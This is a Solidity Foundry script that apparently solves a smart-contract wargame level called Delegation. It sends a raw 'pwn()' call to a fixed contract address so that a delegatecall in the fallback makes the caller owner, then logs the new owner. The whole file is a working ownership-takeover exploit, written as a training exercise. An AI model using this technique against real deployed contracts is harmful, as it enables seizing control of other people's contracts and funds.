// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSol is Script {
    Delegation public delegation_ = Delegation(0x1DA74f2DCF167be33f71eF46b1B01eDE3e6752Fb);

    function run() external {
        vm.startBroadcast();

        address(delegation_).call(abi.encodeWithSignature("pwn()"));
        console.log("owner: ", delegation_.owner());

        vm.stopBroadcast();
    }
}